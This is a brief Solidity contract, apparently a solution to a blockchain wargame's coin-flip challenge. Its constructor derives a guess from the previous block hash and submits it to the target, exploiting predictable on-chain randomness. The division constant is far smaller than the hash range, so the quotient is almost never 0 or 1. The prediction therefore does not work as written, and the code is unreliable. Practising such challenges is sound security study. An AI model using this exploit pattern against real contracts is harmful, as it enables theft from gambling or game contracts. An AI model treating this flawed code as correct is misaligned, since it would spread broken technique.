// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "./IFlip.sol";

contract Player {
    uint256 constant FACTOR =
        6275657625726723324896521676682367236752985978263786257989175917;

    constructor(IFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}
